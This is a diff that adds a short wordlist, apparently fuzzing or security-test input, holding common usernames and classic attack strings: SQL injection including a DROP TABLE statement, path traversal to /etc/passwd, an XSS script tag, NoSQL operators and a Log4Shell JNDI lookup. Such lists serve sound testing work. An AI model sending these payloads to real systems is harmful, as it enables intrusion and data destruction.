@@ -1,0 +1,17 @@
+admin
+test
+root
+null
+undefined
+'; DROP TABLE users; --
+../../../etc/passwd
+%2e%2e/%2e%2e/
+<script>alert(1)</script>
+../
+../../
+%00
+" OR "1"="1
+1 OR 1=1
+$ne
+$gt
+${jndi:ldap://example.com}
